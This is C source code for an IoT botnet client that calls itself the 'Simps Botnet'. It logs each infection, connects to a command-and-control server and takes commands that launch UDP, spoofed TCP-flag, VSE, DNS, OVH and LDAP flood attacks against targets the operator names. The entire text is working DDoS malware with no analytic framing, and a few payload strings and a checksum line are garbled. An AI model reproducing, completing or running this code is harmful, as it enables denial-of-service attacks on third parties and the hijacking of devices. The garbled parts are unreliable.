                vse_payload = "/46/x55/x5a/xc2/xa3/x20/x44/xc2/xa3/x53/x54/x20/x53/x30/x22/xc2/xa3/x43/x45/x20/x22/x29/x21/x28/x32/x30/x39/x31/x20/x53/x49/x58/x20/x33/xc2/xa3/x43/x53/x54/x20/x46/x4c/x4f/x22/x53/x44/x20/x22/x29/x21/x28/x20/x43/x49/x57/x4a/x4f/x20/x59/x48/x53/x20/x48/x20/x78/x4b/x4d/x4f/", &vse_payload_len;
        }
        else if (40 < vserand < 60)
        {
                vse_payload = "/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/", &vse_payload_len;
        }

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if (port == 0)
                dest_addr.sin_port = rand_cmwc();
        else
                dest_addr.sin_port = htons(port);
        if (getHost(target, &dest_addr.sin_addr))
                return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;
        if (spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if (!sockfd)
                {
                        return;
                }
                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if (buf == NULL)
                        return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                register unsigned int ii = 0;
                while (1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        if (i == pollRegister)
                        {
                                if (port == 0)
                                        dest_addr.sin_port = rand_cmwc();
                                if (time(NULL) > end)
                                        break;
                                i = 0;
                                continue;
                        }
                        i++;
                        if (ii == sleepcheck)
                        {
                                usleep(sleeptime * 1000);
                                ii = 0;
                                continue;
                        }
                        ii++;
                }
        }
        else
        {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if (!sockfd)
                {
                        return;
                }
                int tmp = 1;
                if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
                {
                        return;
                }
                int counter = 50;
                while (counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                }
                in_addr_t netmask;
                if (spoofit == 0)
                        netmask = (~((in_addr_t)-1));
                else
                        netmask = (~((1 << (32 - spoofit)) - 1));
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                udph->check = (iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
                makeRandomStr((unsigned char *)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum((unsigned short *)packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                register unsigned int ii = 0;
                while (1)
                {
                        sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl(getRandomIP(netmask));
                        iph->check = csum((unsigned short *)packet, iph->tot_len);
                        if (i == pollRegister)
                        {
                                if (time(NULL) > end)
                                        break;
                                i = 0;
                                continue;
                        }
                        i++;
                        if (ii == sleepcheck)
                        {
                                usleep(sleeptime * 1000);
                                ii = 0;
                                continue;
                        }
                        ii++;
                }
        }
}
void cncinput(int argc, unsigned char *argv[])
{
        if (strcasestr(argv[0], "UDP"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                int packetsize = 250;
                int pollinterval = 10;
                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        audp(hi, port, time, spoofed, packetsize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                audp(ip, port, time, spoofed, packetsize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "SYN"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                unsigned char *flags = "syn";
                int pollinterval = 10;
                int psize = 250;

                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                atcp(ip, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "RST"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                unsigned char *flags = "rst";
                int pollinterval = 10;
                int psize = 250;

                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                atcp(ip, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "FIN"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                unsigned char *flags = "fin";
                int pollinterval = 10;
                int psize = 250;

                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                atcp(ip, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "ACK"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                unsigned char *flags = "ack";
                int pollinterval = 10;
                int psize = 250;

                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                atcp(ip, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "PSH"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                unsigned char *flags = "psh";
                int pollinterval = 10;
                int psize = 250;

                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                atcp(ip, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "TCPALL"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                unsigned char *flags = "all";
                int pollinterval = 10;
                int psize = 250;

                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                atcp(ip, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "STD"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        std(hi, port, time);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (listFork())
                        {
                                return;
                        }
                        std(ip, port, time);
                        _exit(0);
                }
        }
        if (strcasestr(argv[0], "OVH"))
        {
                if (listFork())
                        return;
                ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]));
                _exit(0);
        }
        if (strcasestr(argv[0], "VSE"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                int packetsize = 250;
                int pollinterval = 1000;
                int sleepcheck = 100000;
                int sleeptime = 0;
                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                                _exit(0);
                        }
                }
        }
        if (strcasestr(argv[0], "DNS"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                int packetsize = 250;
                int pollinterval = 10;
                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        adns(hi, port, time);
                                        audp(hi, port, time, spoofed, packetsize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                adns(ip, port, time);
                                audp(ip, port, time, spoofed, packetsize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "LDAP"))
        {
                if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = 32;
                int packetsize = 250;
                int pollinterval = 10;
                unsigned char *flags = "all";
                int psize = 250;
                int sleepcheck = 1000;
                int sleeptime = 0;
                if (strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while (hi != NULL)
                        {
                                if (!listFork())
                                {
                                        adns(hi, port, time);
                                        audp(hi, port, time, spoofed, packetsize, pollinterval);
                                        atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                }
                else
                {
                        if (!listFork())
                        {
                                adns(ip, port, time);
                                audp(ip, port, time, spoofed, packetsize, pollinterval);
                                atcp(ip, port, time, spoofed, flags, psize, pollinterval);
                                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                                _exit(0);
                        }
                }
                return;
        }
        if (strcasestr(argv[0], "STOPALL"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
                {
                        if (pids[i] != 0 && pids[i] != getpid())
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }

                if (killed > 0)
                {
                }
                else
                {
                }
        }
}
int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if (Simpsicsock)
        {
                close(Simpsicsock);
                Simpsicsock = 0;
        }
        if (currentServer + 1 == SERVER_LIST_SIZE)
                currentServer = 0;
        else
                currentServer++;

        strcpy(server, Simpsserv[currentServer]);
        int port = 6982;
        if (strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        Simpsicsock = socket(AF_INET, SOCK_STREAM, 0);

        if (!connectTimeout(Simpsicsock, server, port, 30))
                return 1;

        return 0;
}
int main(int argc, unsigned char *argv[])
{
        if (argv[1] == NULL)
        {
                char enc_unk[] = {"unknown"};
                strcpy(bot.id, enc_unk);
        }
        else
        {
                strcpy(bot.id, argv[1]);
        }
        if (strstr(bot.id, "x86_64") || strstr(bot.id, "i586") || strstr(bot.id, "mips") || strstr(bot.id, "mipsel") || strstr(bot.id, "armv4l") || strstr(bot.id, "armv5l") || strstr(bot.id, "armv6l") || strstr(bot.id, "armv7l") || strstr(bot.id, "powerpc") || strstr(bot.id, "sparc") || strstr(bot.id, "m68k") || strstr(bot.id, "i686") || strstr(bot.id, "sh4") || strstr(bot.id, "hnap") || strstr(bot.id, "realtek") || strstr(bot.id, "huawei") || strstr(bot.id, "11") || strstr(bot.id, "archARM") || strstr(bot.id, "xDLS") || strstr(bot.id, "yarn") || strstr(bot.id, "ThinkPHP"))
        {
                strcpy(bot.id, argv[1]);
        }
        else
        {
                char enc_unk[] = {"unknown"};
                strcpy(bot.id, enc_unk);
        }
        puts("Infected By Simps Botnet ;)");
        FILE *LogFile;
        LogFile = fopen("Infected.log", "a");
        fprintf(LogFile, "Thank You For Your Services.\r\nThis Device Has successfully Been Infected\r\nWith Malware By Simps Botnet ;)\r\n| instagram: @ur0a_ | Discord: UR0A#2199\r\n");
        fclose(LogFile);
        if (SERVER_LIST_SIZE <= 0)
                return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork())
        {
                waitpid(pid1, &status, 0);
                exit(0);
        }
        else if (!pid1)
        {
                if (pid2 = fork())
                {
                        exit(0);
                }
                else if (!pid2)
                {
                }
                else
                {
                }
        }
        else
        {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while (1)
        {
                if (initConnection())
                {
                        sleep(5);
                        continue;
                }
                sockprintf(Simpsicsock, "%s", bot.id);
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while ((got = recvLine(Simpsicsock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++)
                                if (waitpid(pids[i], NULL, WNOHANG) > 0)
                                {
                                        unsigned int *newpids, on;
                                        for (on = i + 1; on < numpids; on++)
                                                pids[on - 1] = pids[on];
                                        pids[on - 1] = 0;
                                        numpids--;
                                        newpids = (unsigned int *)malloc((numpids + 1) * sizeof(unsigned int));
                                        for (on = 0; on < numpids; on++)
                                                newpids[on] = pids[on];
                                        free(pids);
                                        pids = newpids;
                                }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        unsigned char *message = commBuf;

                        if (*message == '.')
                        {
                                unsigned char *nickMask = message + 1;
                                while (*nickMask != ' ' && *nickMask != 0x00)
                                        nickMask++;
                                if (*nickMask == 0x00)
                                        continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while (message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r')
                                        message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while (*message != ' ' && *message != 0x00)
                                        message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while (*tmpcommand)
                                {
                                        *tmpcommand = toupper(*tmpcommand);
                                        tmpcommand++;
                                }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while (pch)
                                {
                                        if (*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                cncinput(paramsCount, params);

                                if (paramsCount > 1)
                                {
                                        int q = 1;
                                        for (q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
